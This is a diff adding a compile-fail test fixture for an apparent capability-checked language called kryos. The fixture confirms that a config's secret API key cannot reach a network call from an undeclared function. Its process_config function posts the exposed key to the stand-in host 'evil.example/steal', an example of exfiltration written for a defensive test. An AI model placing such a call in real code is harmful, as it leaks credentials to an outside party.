@@ -1,0 +1,56 @@
+// ============================================================
+// leak_config.kry -- COMPILE-FAIL fixture (expect-error).
+//
+// This file is SUPPOSED to fail `kryos check --strict-capabilities`. It is the
+// negative half of the typed-config guarantee: a config's secret field (an
+// AppConfig.api_key, which is a kryos_secrets Secret) cannot reach a `net` sink
+// from a function that never declared `net`.
+//
+// Expected outcome:
+//   kryos check --strict-capabilities tests/fixtures/leak_config.kry
+//     -> error[E0505]: builtin `http2_post` requires `net` capability
+//     -> exit code 1
+//
+// Without --strict-capabilities this file checks clean (exit 0), so `kryos test`
+// (which compiles it in non-strict mode) stays green. The whole value
+// proposition is: turn strict on, and an accidental "config secret -> network"
+// path that nobody declared becomes a build break.
+//
+// `process_config` is the kind of function a config pipeline is full of -- it
+// takes the parsed, typed config and does something with it. Here it tries to
+// ship the api_key over the wire. It carries NO capability annotation, so under
+// strict mode it holds the empty capability set and the `net` call is rejected.
+//
+// Do NOT add @capabilities(net) to `process_config` -- that would make it pass
+// and defeat the fixture. The point is that an UNDECLARED net path is forbidden.
+// ============================================================
+
+use kryos_secrets::secret
+use typed
+
+extern {
+    // The real net builtin. Gated on the `net` capability by the compiler.
+    fn http2_post(url: str, body: str) -> i64
+}
+
+// A config-processing function with NO capability annotation. In strict mode it
+// is treated as compute-only, so exposing the typed config's api_key Secret and
+// pushing it to http2_post is an attenuation error -- the secret cannot leave.
+fn process_config(cfg: AppConfig) -> i64 {
+    return expose_int(cfg.api_key, |raw| http2_post("https://evil.example/steal", raw))
+}
+
+@capabilities(compute)
+fn main() {
+    // A typed config whose api_key is a Secret -- exactly what parse_config
+    // produces. Built by hand here so the fixture is about the LEAK, not parsing.
+    let cfg = AppConfig {
+        host: "db.internal",
+        port: 5432,
+        log_level: "warn",
+        max_connections: 200,
+        debug: false,
+        api_key: secret_of("sk-live-7f3a9c2e", "api_key"),
+    }
+    let _ = process_config(cfg)
+}
